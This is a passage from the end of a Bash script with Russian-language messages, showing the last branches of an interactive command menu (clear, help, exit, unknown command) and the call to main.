                ;;
            "clear")
                banner
                ;;
            "help"|"?")
                show_help
                ;;
            "exit"|"quit")
                echo -e "${YELLOW}Выключаю пулемёт...${NC}"
                exit 0
                ;;
            "")
                ;;
            *)
                echo -e "${RED}Неизвестная команда: $cmd${NC}"
                echo -e "${YELLOW}Введи 'help' для списка команд${NC}"
                ;;
        esac
    done
}

# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================
main "$@"